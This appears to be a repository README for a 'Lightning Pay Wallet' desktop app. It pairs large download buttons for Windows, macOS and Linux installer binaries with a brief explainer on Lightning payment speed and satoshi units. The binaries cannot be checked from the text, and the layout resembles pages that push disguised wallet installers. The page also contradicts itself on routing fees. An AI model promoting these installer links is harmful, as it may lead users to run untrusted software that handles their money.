<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# How fast a Lightning payment is, and what a satoshi is worth
Seconds when a route exists, and the units the amounts are actually written in.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Lightning's headline property is speed. It is worth knowing what "instant" actually depends on, and
what the numbers on screen mean.

## Seconds, not minutes

A payment settles in the time it takes the route to complete, usually a second or two. There is no
block to wait for and no confirmation count. That is the whole reason the network exists.

What can make it slower is not the protocol but the participants: a counterparty that is offline, a
route that has to be retried, or a wallet still syncing after a long time closed.

## What "instant" depends on

A route with enough capacity on every hop. Both ends online at the moment of the attempt. A fresh
invoice that has not expired. When one of those fails, the payment fails rather than queues, which is
why Lightning feels binary: done or not done.

## A satoshi

One bitcoin is 100,000,000 satoshis. A satoshi is the smallest unit the base layer can express, and a
Lightning payment can be smaller in principle but not spendable below it.

Prices in the wallet are shown in sats, which makes amounts look large next to a bitcoin figure. A
routing fee of a few sats is genuinely tiny; the numbers just have no decimal point to reassure you.

## On-chain, for contrast

An on-chain transaction waits for a block, and blocks average ten minutes with variance. A low fee can
mean hours. Opening or closing a channel is an on-chain transaction, so the slow step in Lightning is
the one that touches the chain.

## What this means in practice

Paying at a counter works because the payment completes before you put the phone away. Receiving a
salary over Lightning works for the same reason. Moving a channel does not, and it should not be
expected to.

## Questions people ask

### Can a payment be faster than a second?

Sometimes, at the protocol level. The user-visible answer is "about a second".

### Why is my on-chain transfer still pending?

It is waiting for a block. Lightning speed does not apply to the base layer.

### Are fees paid in sats?

Yes, routing fees are fractions of a satoshi per hop.
